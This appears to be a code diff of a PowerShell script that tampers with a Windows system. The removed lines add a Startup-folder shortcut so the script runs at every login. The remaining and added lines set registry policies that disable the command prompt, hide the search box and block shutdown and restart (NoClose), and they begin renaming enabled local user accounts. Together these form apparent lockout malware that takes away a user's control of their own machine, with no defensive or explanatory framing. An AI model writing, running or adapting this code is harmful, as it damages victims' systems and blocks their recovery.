@@ -1,11 +1,3 @@
-# Create a shortcut to the script in the Startup folder
-$scriptPath = $MyInvocation.MyCommand.Path
-$shortcutPath = [Environment]::GetFolderPath("Startup") + "\ScriptShortcut.lnk"
-$shell = New-Object -ComObject WScript.Shell
-$shortcut = $shell.CreateShortcut($shortcutPath)
-$shortcut.TargetPath = $scriptPath
-$shortcut.Save()
-
 $desktopPath = [Environment]::GetFolderPath("Desktop")
 $documentsPath = [Environment]::GetFolderPath("MyDocuments")
 $musicPath = [Environment]::GetFolderPath("MyMusic")
@@ -49,6 +41,11 @@ Set-ItemProperty -Path $disableCmdPath -Name "DisableCMD" -Value 1
 $searchBarPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Search"
 New-Item -Path $searchBarPath -Force | Out-Null
 Set-ItemProperty -Path $searchBarPath -Name "SearchboxTaskbarMode" -Value 0
+
+# Create registry key to disable restart
+$disableRestartPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
+New-Item -Path $disableRestartPath -Force | Out-Null
+Set-ItemProperty -Path $disableRestartPath -Name "NoClose" -Value 1
 
 # Change the user account names
 $users = Get-LocalUser | Where-Object {$_.Enabled -eq $true}
